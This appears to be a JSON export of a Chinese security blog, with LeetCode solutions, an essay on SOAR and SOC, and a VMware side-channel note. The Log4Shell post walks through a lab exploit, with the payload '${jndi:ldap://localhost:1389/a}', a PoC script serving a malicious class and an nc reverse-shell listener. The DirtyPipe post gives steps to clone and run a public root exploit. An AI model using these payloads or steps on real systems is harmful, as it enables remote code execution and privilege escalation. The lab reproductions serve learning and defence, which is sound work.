count","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"26. Remove Duplicates from Sorted Array","date":"2022-05-04T14:48:30.000Z","path":"2022/05/04/LeetCode/26. Remove Duplicates from Sorted Array/","text":"题目 思路这道题我被绕进去了导致花了挺久来思考，其实很简单。重点在于三个地方：1、不能为另一个数组生成额外空间，不然的话直接塞新数组里面就完事。2、新数组后面部分是什么无所谓。3、目标的数组是一个排了序的数组。所以这道题只需要遍历数组，发现重复的就把后面的往前挪并且覆盖掉重复的就行。。具体说，可以维护2个指针，慢指针开始指向数组第一个元素，快指针指向第二个元素，然后快指针不断判断自己当前元素和前一个元素是否相同，相同则快指针后移，不相同则将当前值赋值给慢指针的后一个元素，慢指针后移。最后慢指针指向的元素及前面所有元素都是不重复的。 1234567891011121314class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; if len(nums)&lt;=1: return len(nums) count = 0 for i in range(len(nums)): if nums[count] != nums[i]: count += 1 nums[count] = nums[i] return count + 1","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"1. Two Sum","date":"2022-05-04T10:25:27.000Z","path":"2022/05/04/LeetCode/1. Two Sum/","text":"题目 https://leetcode.com/problems/two-sum/ 这是leetcode第一道题，说实话要做出来很简单。暴力加减就行。简单看了看高级一些的做法，基本都是和hash表有关，等第二遍的时候再看吧。 1234567891011class Solution(object): def twoSum(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; for i in range(len(nums)): for j in range(i+1,len(nums)): if nums[j]==target-nums[i]: return [i,j] 例程和我基本完全一致，但是有一个地方引起了我的注意。 1def twoSum(self, nums: List[int], target: int) -&gt; List[int]: 从stackoverflow上找到了答案：https://stackoverflow.com/questions/56506017/what-is-the-meaning-of-listint-in-this-function-declaration 简单来说是一种python3的特性，叫做type hint(or function annotation) -&gt; List[int] means that the function should return a list of integers. nums: List[int], target: int means that nums is expected to be a list of integers and that target is expected to be an integer. 我理解为一个类型提示，用于表达这里的变量或者数组本来应该是什么类型。而且可以使用某些函数进行额外的检查。","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"}],"categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"}]},{"title":"DirtyPipe（CVE-2022-0847）","date":"2022-03-10T05:11:23.000Z","path":"2022/03/10/600 Privilege Escalation 权限提升/DirtyPipe(CVE-2022-0847)/","text":"DirtyPipe CVE-2022-0847漏洞类型：内核提权漏洞 描述：可以覆盖任意只读文件中的数据，并获得 root 权限。 漏洞影响范围：5.8 &lt;= Linux 内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102 复现环境：5.10.0-kali3-amd64 参考链接 https://blog.csdn.net/WWL0814/article/details/123354623 https://github.com/imfiver/CVE-2022-0847 漏洞复现使用Dirty-Pipe.sh文件进行提权 下载链接 https://github.com/imfiver/CVE-2022-0847 复现步骤 登录kali普通用户账号，查看下用户 whoami 打开终端下载文件 git clone https://github.com/imfiver/CVE-2022-0847.git 进入文件目录 cd CVE-2022-0847 查看下目录中内容 ls 运行Dirty-Pipe.sh文件 bash Dirty-Pipe.sh 可以看到已经进入root了，用whoami看看 whoami","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"原理分析","slug":"原理分析","permalink":"http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"name":"提权漏洞","slug":"提权漏洞","permalink":"http://ciaofox.me/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"600 Privilege Escalation 权限提升","slug":"600-Privilege-Escalation-权限提升","permalink":"http://ciaofox.me/categories/600-Privilege-Escalation-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]},{"title":"雪崩-log4j漏洞粗谈","date":"2021-12-13T07:51:56.000Z","path":"2021/12/13/400 Execution 攻击/雪崩-log4j漏洞粗谈/","text":"什么是log4j2我们先看Apache log4j的官方网站上的描述： Apache Log4j 2 is an upgrade to Log4j that provides significant improvements over its predecessor, Log4j 1.x, and provides many of the improvements available in Logback while fixing some inherent problems in Logback’s architecture. 或者我们采用wikipedia对它的描述 Apache Log4j is a Java-based logging utility originally written by Ceki Gülcü. It is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j is one of several Java logging frameworks.Gülcü has since started the SLF4J and Logback[4] projects, with the intention of offering a successor to Log4j.The Apache Log4j team developed Log4j 2 [5] in response to the problems of Log4j 1.2, 1.3, java.util.logging and Logback, addressing issues which appeared in those frameworks.[6] In addition, Log4j 2 offered a plugin architecture which makes it more extensible than its predecessor. Log4j 2 is not backwards compatible with 1.x versions,[7] although an “adapter” is available. On August 5, 2015, the Apache Logging Services Project Management Committee announced that Log4j 1 had reached end of life and that users of Log4j 1 were advised to upgrade to Apache Log4j 2.[8] 或者干脆采用百度的说法： Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。 很显然，这是java一个最基础的，功能强大的，适配性极强的开源日志模块。它的使用范围非常广，这也就意味着这次漏洞的影响范围非常大。 漏洞概述这个漏洞在2021年12月9日被阿里云应急响应中心直接公布（我真的很怀疑这不违反漏洞管理方法吗？）（更新下，阿里云因为违法漏洞管理方法被处罚了，笑死。）。发布时间我没记错的话应该是在傍晚，无数公司为了它整夜响应，log4j官方快速释放出log4j-2.15.0-rc1，但是该版本据传依然存在绕过，后续log4j2接连放出了log4j-2.15.0-rc2、log4j-2.16、log4j-2.17等版本，完全修复了该漏洞的利用环。 说回漏洞。在9号时候阿里云公布的不只是漏洞存在情况，还包括验证POC和漏洞原理。漏洞的原理其实非常简单，log4j会默认打印error和fatal级别的日志，当日志信息中存在特定构造的参数时候，会执行JndiLookup方法进行进一步处理，最终加载由攻击者传入的LDAP服务端地址，然后返回一个恶意的JNDI Reference对象，触发漏洞，实现 RCE。（当然目前的POC大多是用DNS查询记录来验证） 漏洞编号为CVE-2021-44228 影响范围版本影响根据CVE所描述的范围： Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects. 漏洞存在的版本为2.0-beta9 &lt;= Apache Log4j &lt;= 2.15.0-rc1间的所有版本。而log4j 1的所有版本都不存在这个漏洞。 供应链影响范围经不完全统计，直接和间接引用Log4j的开源组件共计超过17万个； log4j的1～4层引用关系：直接引用log4j的组件有6960个，第二层引用的超过3万个，第三层超过9万个，第四层超过16万个，总计有173200+个开源组件受Log4j漏洞影响。 已知受影响应用及组件： VMware大部分产品 Jedis Logging Logstash HikariCP Hadoop Hive ElasticSearch Apache Solr Apache Struts2 Apache Flink Apache Druid Apache Log4j SLF4J Binding spring-boot-strater-log4j2 Camel :: Core JBoss Logging 3 JUnit Vintage Engine WSO2 Carbon Kernel Core 直接引用log4j的组件可参考如下链接： https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1 关于攻击趋势相关内容建议看这篇360应急响应的文章：360 Netlab Blog - Network Security Research Lab at 360—从蜜罐视角看Apache Log4j2漏洞攻击趋势 另外说起来的话，官方第一时间释出的log4j 2.15.0-rc1据说是存在RCE漏洞，但是实际上该漏洞需要去修改其默认配置，让本来已经禁用了JNDI的配置重新启用…我是真的想不出来到底什么业务才会这么执着地需要JNDI来执行？而log4j 2.15.0还存在一些问题，其中比较严重的是一个DoS攻击，所以推荐是升级到2.16版本。 log4j-2.17.0是为了修复CVE-2021-45105，一个DoS漏洞。 Apache Log4j2 版本 2.0-alpha1 到 2.16.0 没有防止 self-referential 查找的不受控制的递归。当日志配置使用非默认的 Pattern Layout 与 Context Lookup（例如，$${ctx:loginId}）时，控制线程上下文映射 (MDC) 输入数据的攻击者可以制作包含递归查找的恶意输入数据，导致 StackOverflowError，从而终止进程。这也称为 DoS 攻击。从 2.17.0 版本开始（针对 Java 8），只有配置中的查找字符串才会被递归扩展；在任何其他用法中，仅解析顶层查找，不解析任何嵌套查找。 （29日更新一下，2.17.0版本出现了一个RCE漏洞，CVE-2021-44832，但又是需要去修改默认配置文件的漏洞。Jesus，这事没完了是吧？在这篇文章中有关于log4j后续漏洞的讨论，我非常赞成其总结：通过配置文件来实现 RCE，只能说是一种手段，而不能说是一种常规漏洞。) 时间线2021-11-24 阿里云安全团队向Apache 官方提交ApacheLog4j2远程代码执行漏洞（CVE-2021-44228） 2021-12-05 官方增加两处commit修复漏洞 2021-12-07 官方发布2.15.0-rc1 版本 2021-12-09 阿里云安全响应团队发布漏洞风险提示 2021-12-10 官方紧急发布2.15.0-rc2版本修复rc1版本绕过问题 2021-12-10 CVE颁发漏洞编号:CVE-2021-44228 2021-12-10 CNVD颁发漏洞编号:CNVD-2021-95914 2021-12-13 官方发布2.16.0 版本 2021-12-17 官方发布2.17.0 版本 2021-12-27 官方发布2.17.1 版本以修复CVE-2021-45105 漏洞复现漏洞发布时同时释出了POC和EXP，目前最常规的几种验证方法无非是： 1、用代码模拟一个最简的log4j或是JNDI或者lookup环境，输入payload，载入远程代码（其实就是本地的另一个端口），然后弹个计算器。2、搭建一个（或者找一个）带有log4j2的环境，然后用DNSlog来判断是否成功 我个人感觉用代码层面去测试最多只能确认漏洞的存在，更细节的地方会有一些问题，所以在这里我们使用比较直观的方式2验证。 DNS确认漏洞存在漏洞环境靶机：采用了docker搭建的方式，sprintboot框架加入log4j2日志模块实现了一个登录系统。https://github.com/Ode1esse/springboot-login-log4j2-docker DNS服务器：https://ceye.io DNS验证网址：https://test.z**tzt.ceye.io 漏洞复现搭建过程没什么好说的，地址里面有docker-compose.yml，直接载入搭建就好。docker搭建本来就很轻松。搭建之后应该是这样的效果： 然后将payload分别插入账号和密码处，这里我们插入不同的dns地址，从而实现不同的区分，来确定薄弱点存在于哪里。（这也是fuzzing的思维） 这里返回了一个账号密码错误（当然是错误的） 然后我们查看一下DNS平台是否有解析记录。 显然只有username字段，也即是用户名字段触发了漏洞，导致服务器端向该url发送DNS请求。到这里我们实际上已经确认存在了漏洞的存在，但是为什么只有在username字段插入payload才生效呢？ log4j2 shell漏洞的原理是日志框架从日志中识别到JNDI后才会调用方法，实现RCE。那么我们可以进入到docker内部去查看一下日志。 可以看出我们刚刚的错误是最后一条。 其中记录了时间，错误类型，还有账号名。日志中只会保存账号名，所以只有在账号名处插入payload才会被log4j2框架解析，执行JNDI方法从远端请求资源。 如果之后利用此漏洞的话，需要提前注意目标会储存哪些信息进日志，大部分系统会储存错误信息中的IP，账号和密码，少数会额外存储User-Agent字段，可以对此进行fuzzing。 利用漏洞获取shell漏洞环境本次的教程全程参考此链接：https://raxis.com/blog/log4j-exploit （纯英文） 所需要的github库为： https://github.com/kozmer/log4j-shell-poc 在kali虚拟机内使用docker搭建了靶机，并且在本地打开了log4j2 shell的恶意类与NC监听服务。当payload发送到靶机时将会触发靶机访问恶意类，并回弹shell到NC监听的端口，实现RCE。 漏洞复现从github克隆下来的仓库中有需要的几乎所有东西，并且在它的README中也包含了几乎所有教程。按照它们走就好。 首先按照文件pip所需要的东西。 1pip install -r requirements.txt 打开nc并且监听9001端口 1nc -lvnp 9001 搭建docker靶机， 123cd log4j-shell-poc/sudo docker build -t log4j-shell-poc .sudo docker run --network host log4j-shell-poc 搭建成功后可以通过访问http://localhost:8080/ 找到你的访问网页。 开始构造漏洞利用恶意类，注意我们需要手动下载java对应版本jdk，这里推荐使用java-8u20. 获取jdk及具体操作：https://github.com/kozmer/log4j-shell-poc#getting-the-java-version 下载java版本的地址（需要注册oracle账号）：https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html 下载后将 jdk1.8.0_20 文件复制到log4j-shell-poc文件夹中，开始启用恶意类。 1234567891011$ python3 poc.py --userip localhost --webport 8000 --lport 9001[!] CVE: CVE-2021-44228[!] Github repo: https://github.com/kozmer/log4j-shell-poc[+] Exploit java class created success[+] Setting up fake LDAP server[+] Send me: $&#123;jndi:ldap://localhost:1389/a&#125;Listening on 0.0.0.0:1389 开始复现，在用户名框输入payload：$&#123;jndi:ldap://localhost:1389/a&#125;，密码可以随便输入 分别查看恶意类和nc服务。 显然这里NC已经受到了回弹的shell，测试一下。 成功复现。 原理分析本章受制于作者的java水平（是的我和大部分安全人员一样主要写python），所以本节只能粗浅地尝试探究一下漏洞的原理。本节末尾会附上一些写得不错的原理分析文章，如果感兴趣可以借助这些文章更加深入。 漏洞原理触发漏洞的关键点在于两个部分： 1.org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format() 方法（表达式内容替换）： 这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${ 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。 在 ${ 中可以使用的关键词可以通过官方文档查看： 2.apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换） 日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。 由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload: ${jndi:ldap://ip/port/exp} 最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图所示： 漏洞利用整个利用流程分两步： 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。 关于利用LDAP服务来进行注入攻击已经不是第一次了，JNDI注入，即某代码中存在JDNI的string可控的情况，可构造恶意RMI或者LDAP服务端，导致远程任意类被加载，造成任意代码执行。Fastjson RCE漏洞的利用也用到LDAP注入攻击，还有其他的一些。 参考链接https://www.freebuf.com/vuls/317446.html https://www.freebuf.com/sectool/313774.html http://blog.topsec.com.cn/java-jndi注入知识详解/ https://logging.apache.org/log4j/2.x/manual/lookups.html 总结这个漏洞在我看来就像是《雪崩》中的图片病毒，只要简单接触就可以轻松地控制一个系统的所有权限或是让它彻底瘫痪。同时它也是一场雪崩，全面地席卷了整个安全圈，几乎所有大公司都在影响范围中。在未来几年的护网中，它可能和shiro一起成为主要突破点。 这个漏洞并不复杂，简单到甚至看看官方文档都有可能发现，因为它根植于log4j2的正常功能，但是这么久了都没被发现，这部分说明了大家对于开源工具的松懈。过去开源一直是安全/稳定的代名词，公司对开源都会默认是安全的，因为“肯定有很多人看过代码，如果有问题早就发现了”，使用越广的开源工具越是如此。但log4j2事件直接戳破了这个幻想——大家其实并不太看代码，都是拿来就用。 同时这件事再次强调了供应链安全，安全左移是必然的趋势，log4j2只是一个开始，还有多少底层开源组件里面存在着危险的漏洞？公司不敢赌，所以必然会加强审查。开源卫士/代码卫士/黑鸭（black duck)这些代码审计服务的出现和盛行就是一个显著的信号。 那么作为一位安全人员，这是否又是一个新的机会呢？","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"原理分析","slug":"原理分析","permalink":"http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"name":"远程代码执行","slug":"远程代码执行","permalink":"http://ciaofox.me/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}],"categories":[{"name":"400 Execution 攻击","slug":"400-Execution-攻击","permalink":"http://ciaofox.me/categories/400-Execution-%E6%94%BB%E5%87%BB/"}]},{"title":"SOAR，SOC和安全","date":"2021-08-25T02:19:12.000Z","path":"2021/08/25/安全运营/SOAR，SOC和安全/","text":"前言毕业之后因为疫情找不到好的渗透岗，一度考虑去做安全运维，最后机缘巧合去了一家安全集成公司，什么都做，每天都感觉在打杂。这个过程很痛苦，但是也让我对安全运营有了一定的了解和思考。而后续在一些hw和重保中，我对于安全运维也开始有一些更进一步的看法了。 当我看到SOAR的概念时，很自然地，我将其与SOC平台进行了比较。它们之间有一条很细微的区分界限，这条线很难把握但又确实存在。我希望通过这篇文章对SOAR和SOC进行一个稍微深入一些的探究。 从源头探究起：什么是SOAR（Security Orchestration, Automation and Response）？从各种资料中我们不难发现SOAR的定义最初在2017年由Gartner创造，它的词条定义是： SOAR refers to technologies that enable organizations to collect inputs monitored by the security operations team. For example, alerts from the SIEM system and other security technologies — where incident analysis and triage can be performed by leveraging a combination of human and machine power — help define, prioritize and drive standardized incident response activities. SOAR tools allow an organization to define incident analysis and response procedures in a digital workflow format. SOAR指的是一种可以让组织收集由安全运营团队所监控的输入的技术。例如，来自SIEM系统和其他安全技术的警报有助于定义、确定优先级并驱动标准化的事件响应活动，在这些安全技术中，可以利用人力和机器的力量来执行事件分析和分类。SOAR工具允许组织以数字工作流格式定义事件分析和响应程序。（机翻） 可以看出这是一个很空洞而又宽泛的概念，后续Gartner又对其进行了不少的修补，最重要的是两篇报告：Preparing Your Security Operations for Orchestration and Automation ToolsMarket Guide for Security Orchestration, Automation and Response Solutions 第一篇文章对SOAR进行了很详细的定义与指导，但是我没有找到可以免费看这篇文档的地方，所以这里我只能放出它的目录来: Analysis Defining SOAR SOAR Drivers and Enablers SOAR for Security Staff Productivity Additional SOAR Drivers SOAR Enablers SOAR Use Cases Detection and Triage Use Cases Incident Response Use Cases Threat Intelligence Use Cases Detailed Use Case Example: Phishing Email Handling SOAR Technologies in Depth Workflow and Collaboration Engine Case and Ticket Management Orchestration and Automation Threat Intelligence Management Other Components and Capabilities SOAR Architecture Differences Between Existing SOAR Tool Categories SOAR Future Strengths Weaknesses Guidance Decide on the Need and Readiness for SOAR Build a Business Case for SOAR Select the Right SOAR Tool for You Test the SOAR Tools Align Skills Needed for SOAR Success Deploy the SOAR Technology Use SOAR Tools Effectively Expand and Evolve Your SOAR Deployment The DetailsGartner Recommended Reading 从这里我们可以看出这篇报告已经涵盖了整个SOAR的定义、应用场景和使用案例，我们可以认为这篇报告确实配得上它自称的”our amazing SOAR paper”。所以我也对它非常好奇，如果有谁可以分享给我满足一下好奇心，那可真是非常感谢了。 再参考一些侧面描述SOAR的文章，如： https://securityintelligence.com/posts/whats-new-2020-gartner-market-guide-soar-solutions/https://www.dflabs.com/resources/blog/gartner-soar-magic-quadrant-the-best-of-incman-soar-is-yet-to-come/https://blog.technologent.com/gartner-soar-model-future-it-security 现在我们可以用自己的话来对其进行一个描述了：SOAR平台是以workflow（工作流）和playbook（剧本）为核心的安全运营中心，它更强调了自动化判断报警级别的作用，并以playbook为核心设置了自动化流程。 从这个意义上我们可以发现SOAR的概念非常眼熟，不管是SIEM还是SOC都与之有一些相似性，但是又各有各强调的点。这也是安全方面概念的一些难点：几乎没有突破性的进展，更多是面对某些情况的修补和适配。（这里可以多说几句，最近几年安全方面强推零信任，安全设备换着名字翻新，而实际上几乎没有技术性的突破。这感觉真是太荒谬了，一方面是red team的技术和工具不断革新换代，利用点从框架漏洞转向侧信道再跳到代码审计上的0day漏洞，利用难度逐渐下降，攻击点越来越多。而blue team呢？不断纠结几个小的点的更新，从零信任到蜜罐到SOAR，不断缝缝补补最新的漏洞，俨然一副”安全的大厦已经建成，之后只需要小修小补”的姿态，最后甚至开始从制度上收紧，我不得不怀疑安全方向未来的发展。 让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？那么让我们先来看一下，什么是SIEM，什么是SOC： SIEM (安全信息和事件管理)是软件和服务的组合，是SIM（安全信息管理）和SEM（安全事件管理）的融合体。两者的区别在 于SEM侧重于实时监控和事件处理方面，SIM侧重历史日志分析和取证方面。SIEM为来自企业和组织中所有IT资源（包括网络、系统和应用）产生的安全信息（包括日志、告警等）进行统一的实时监控、历史分析，对来自外部的攻击行为和内部的违规、误操作行为进行监控、审计分析、调查取证、出具各种报表报告，实现IT资源合规性管理的目标，同时提升企业和组织的安全运营、威胁管理和应急响应能力。 SOC平台，网络安全管理平台。提供集中、统一、可视化的安全信息管理，通过实时采集各种安全信息，动态进行安全信息关联分析与风险评估，实现安全事件的快速跟踪、定位和应急响应。从监控、审计、风险和运维四个维度建立起来的一套可度量的统一业务支撑平台。 从中可以看出，如果以中国的安全设备习惯来说，SIEM更多地接近日志审计平台，各大安全厂商都有这个产品，集中所有的日志对其进行分析（一般是分布式部署），同时可以解决掉等保的日志相关的合规要求。在使用中我用过启明星辰的泰合日志审计平台和360的日志审计中心，还有诸如graylog一类的开源日志平台。它们的主要功能很相似：从各个设备（不局限于安全设备）上发送日志和告警到自己这里，对其进行解析，归纳（有些可以分析），资产发现。一般不会具有响应动作。 而SOC平台，更多地是作为一个集中化的处理中心。它从日志审计中心中读取流量，然后进行分析，归纳，总结。以国内的产品来说，大部分厂商的态势感知平台都是为了这个目的而生的——————一个可以产生警报，调取日志，查询入侵路径的运营中心。这个中心需要部分安全人员值守，这也就是安全运维主要驻场的地方了。 而SOAR，更多地是作为一个SOC的+1版本，为了解决企业使用SOC平台方案后需要大量人力值守的情况，于是自动化就变成了一个新的需求点，SOAR也是为了解决这个需求而应运而生的。SOAR从SIEM中提取日志（是的SOC平台也需要从SIEM中提取日志），如果日志触发了SOAR的剧本的开始 条件，就会开始执行这个剧本。举例来说，某个xxx设备的xxx告警日志会触发我设定好的告警剧本，那么当SOAR平台收到这个告警日志，就会开始执行剧本的后续环节，例如发送警报到邮箱或是钉钉提醒。 短暂休息一下，让我们聊聊目前的安全现状。在几年的安全工作中也大概地理解到了安全工作的尴尬。在过去我能想到的无非是：安全本身并不产生收益，但是却会消耗资源，所以各大公司都不愿意加大安全预算。 从现在的角度看起来这种想法并不能算错，但是委实太粗浅了一些。企业在安全方面的投资在我看来更像是一种”降低受灾概率”的存在。安全设备并不像备份设备一样能够为灾难或是数据丢失兜底，所有安全厂商都会告诉公司，你的系统有很多安全风险，只要购买了我们的xxxx，公司的网络系统就安全了。但是事实是，即使你购买了全套的安全设备，从防火墙到waf到日志审计到防病毒到态势感知到蜜罐…全部上上去，你的系统依然有可能被正面攻破/迂回潜入，你的数据依然有可能会被窃取。 那么企业在这样的环境下，又凭什么花费大力气在安全上呢？ 安全建设从来都需要”由上而下”的力量作为第一推动力，否则企业不可能付出大的投入去做安全。而国内常见的安全现状是什么呢：甲方公司出于合规性的要求去做安全建设；甲方公司领导被乙方洗脑决定推动安全建设来解决自身的安全问题。后者当然比前者要来得更主动，更有决心，更有效果。但是在工作中我见过的后者公司，一只手都能数的过来。 目前的国内公司的安全情况可以从安全投入来讲粗浅地分为三类： 几乎没有安全投入的公司，这类公司一般是初创公司或者小的实业公司，没有太大的网络业务，官网就挂一个静态页面或者随便找外包用框架做一些展示页，维护当然更无从谈起。大部分脚本小子的练手方式就是baidu/google hack这些公司的官网。 稍微有一些安全投入的公司，有一些基础的安全设备如防火墙，waf。可能外包了安全业务给某些小的集成公司或是自己有几个专职安全的IT人员。这些大多是政府机关或是特殊行业公司，让他们对安全方面加大投入的大部分推动力是合规要求。最近几年的hw与等保让这些公司不得不加大在安全上的投入，从结果上来看确实有作用，但是从实际上来看也只能防一些小蟊贼，但是对于稍微深入的大哥还是效果有限。（今年9月1日施行的《关键信息基础设施安全保护条例》禁止了对信息基础设施的扫描，这可以有效地防范来自国内的攻击，然而对于国外的黑客依然无力） 安全措施很妥当的公司，每年有不错的安全预算，一整只安全团队，安全设备样样齐全，安全管理制度合理。这样的公司大多是实权单位或是大型企业，也是HW中能坚持到最后几轮的公司。 但是从结果上来看，这三种公司并没有本质性的差别，在hw中，这三类公司都可能在第一轮被打穿；而在实际中，我见过一则通报，一个地级市的医院单位（第二类）和一家大型企业（第三类）同样遭受了病毒攻击，当时领导开玩笑地问我：你说他们投入在安全方面的预算起作用了吗？ 我哑口无言。 blue team先天上的弱点是，攻击永远比防御要简单，但我并不同意“防御就应该只是修修补补”这种说法。red team正在发掘更多的攻击面，更多的漏洞，更多的工具，形式依然是严峻的。是，最近几年在HW的压力下政府机关的安全投入在不断提高，防御方不断地在修补漏洞，攻击的成本越来越高，看起来成效喜人，可背后是更大的安全运维压力和安全管理压力。头疼医头，脚疼医脚，纵然在IT方面的准则是“没有银弹”，但这种叠补丁式的安全防御法迟早会决堤。 防御方需要一个能够一锤定音式的方法，一种能够解决掉大部分问题的集中化安全中心，但不是SOC，至少不是现在的SOC。SOAR和它的概念接近，但我更看好态势感知的预判功能的后续进展。目前的安全管理类的平台在我看来是纯粹需要人力去堆砌，希望态势感知的发展可以逐步缓解这种安全现状。 最后，让我们来谈谈SOAR的现状和展望说回来，SOAR的出现本身就是为了解决安全运维的压力，但是它的特点——————workflow和playbook作为自动化流程，在我看来现阶段无非是实现流程控制，远远谈不上自动化。（在这里更要吐槽一下安全厂商的假概念，所谓大数据，人工智能，在安全方面的使用比例连画饼都算不上。） 放眼到全球，我们也可以从Gartnar在2020年发布的SOAR市场报告中可以看到这么一段： SOAR tools are still primarily leveraged by organizations with a security operations center. Use cases to support security operations beyond threat monitoring and detection, threat intelligence, and incident response and threat hunting are still nascent. SOAR 工具仍然主要由拥有安全运营中心的组织使用。除了威胁监控和检测、威胁情报、事件响应和威胁搜寻之外，用于支持安全操作的用例仍处于起步阶段。 很显然，SOAR目前在商业上是用作SOC的作用，其自动化特点在逐步完善，但是其安全操作的特点还没有被开发，这应该是它下一步的发展方向。安全运维的流程无非是：查看日志-发现问题-确认问题-处理问题，SOAR现阶段如果能实现帮忙在查看日志之前做一些筛选工作已经足矣，安全运维的压力大多也是在茫茫多的报警日志中去寻找真实的攻击事件，误报严重这件事从根上就不应该让SOAR来解决，而应该从底层，从安全设备的角度来处理。 前段时间看到了国内安全从业者的一段话，我感觉很受启发，作为结束语正合适:关于SOC安全运营中心的理解是多种多样的，有人把它定义为一套包罗万象的安全系统，在系统的基础上，增加一套安全人马来使用SOC系统；有人把它定义为一个安全体系理念，围绕理念，采购产品，添加人员；也有人把它定义为一个部门，例如，安全部=安全运营中心SOC=安全响应中心SRC=安全运营与响应中心SORC。围绕这个SOC部门，配备设备、技术、管理要求；我们不纠结于哪个定义，但要理解，在SOC中，人、技术、管理缺一不可，否则SOC将不能实现O（operation）运营的效果，从而导致失败； 后记这篇文章断断续续写了一周，思路和逻辑都很散漫，我很不满意，但是应该也不会修改了。 希望几年后的我能够对这些概念有更多的思考。","tags":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"}],"categories":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"}]},{"title":"我不知道该说什么，关于侧通道缓解还是side channel mitigations","date":"2021-08-23T02:46:19.000Z","path":"2021/08/23/闲谈/我不知道该说什么，关于侧通道缓解还是side channel mitigations/","text":"前言在新配置的电脑中安装vmware并装上虚拟机之后，出现了“您正在运行的此虚拟机已启用侧通道缓解。侧通道缓解可增强安全性，但也会降低性能。”的一个提示，这勾起了我的好奇心。而在中文网络上搜索了一下发现没有太多可以参考的内容，于是决定自己搜集一下资料做个小总结。 在进入正题之前，首先额外说一个小坑，是关于开启amd-v虚拟化的提示，不开启的话无法使用虚拟机，提示如下： 此主机支持 AMD-V，但 AMD-V 处于禁用状态。如果已在 BIOS/固件设置中禁用 AMD-V，或主机自更改此设置后从未重新启动，则 AMD-V 可能被禁用。(1) 确认 BIOS/固件设置中启用了 AMD-V。(2) 如果此 BIOS/固件设置已更改，请重新启动主机。(3) 如果您在安装 VMware Workstation 之后从未重新启动主机，请重新启动。(4) 将主机的 BIOS/固件更新至最新版本。此主机不支持“AMD RVI”硬件辅助的 MMU 虚拟化。模块“CPUIDEarly”启动失败。未能启动虚拟机。 在AMD-V上我折腾了一阵子，主要是开启SVM功能之后整个物理机变得非常不稳定，时不时蓝屏。最后在关闭了Hyper-V后解决了这些问题。 说回到主题，在vmware中每次打开虚拟机都会出现一个提示： 您正在运行的此虚拟机已启用侧通道缓解。侧通道缓解可增强安全性，但也会降低性能。要禁用缓解，请在虚拟机设置的“高级”面板中更改侧通道缓解设置。有关更多详细信息，请参阅 VMware 知识库文章 79832，网址为 https://kb.vmware.com/s/article/79832。 可以看出中英文的区别，中文更接近于机翻（习惯了，vmware的官网知识库都是机翻的），其中的”侧信道缓解”在英文中是”side channel mitigations”，大家都反馈“每个词都没错，但不是最佳选择，凑一块语法也不对。就是不知所云，不走心的机翻的感觉。”我也觉得翻译为侧信道攻击缓解措施更贴切。 